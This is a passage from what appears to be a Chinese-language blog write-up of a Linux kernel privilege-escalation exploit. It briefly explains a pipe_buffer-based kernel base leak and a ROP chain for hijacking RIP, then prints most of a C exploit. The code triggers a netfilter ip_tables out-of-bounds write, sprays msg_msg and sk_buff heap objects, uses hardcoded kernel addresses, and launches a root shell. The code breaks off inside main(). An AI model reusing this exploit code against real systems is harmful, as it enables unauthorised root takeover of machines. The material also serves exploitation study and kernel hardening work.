class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权"><a href="#Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权" class="headerlink" title="Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权"></a>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/03/31/RW6HFoLJf1AE5kd.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63be0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_eflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, esp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_eflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> socket_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">attribute__</span>((__<span class="hljs-title">packed__</span>)) &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_replace</span> <span class="hljs-title">replace</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> <span class="hljs-title">entry</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_match</span> <span class="hljs-title">match</span>;</span><br>        <span class="hljs-type">char</span> pad[<span class="hljs-number">0x108</span> + PRIMARY_MSG_SIZE - <span class="hljs-number">0x200</span> - <span class="hljs-number">0x2</span>];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_target</span> <span class="hljs-title">target</span>;</span><br>    &#125; data = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    data.replace.num_counters = <span class="hljs-number">1</span>;<br>    data.replace.num_entries = <span class="hljs-number">1</span>;<br>    data.replace.size = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    <br>    data.entry.next_offset = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    data.entry.target_offset = <br>            <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <br>    data.match.u.user.match_size = <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <span class="hljs-built_in">strcpy</span>(data.match.u.user.name, <span class="hljs-string">&quot;icmp&quot;</span>);<br>    data.match.u.user.revision = <span class="hljs-number">0</span>;<br><br>    data.target.u.user.target_size = <span class="hljs-keyword">sizeof</span>(data.target);<br>    <span class="hljs-built_in">strcpy</span>(data.target.u.user.name, <span class="hljs-string">&quot;NFQUEUE&quot;</span>);<br>    data.target.u.user.revision = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// partial overwrite the next object</span><br>    <span class="hljs-keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="hljs-keyword">sizeof</span>(data)))<br>        <span class="hljs-keyword">if</span> (errno == ENOPROTOOPT)<br>            errExit(<span class="hljs-string">&quot;ip_tables module is not loaded!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         socket_fd;<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, 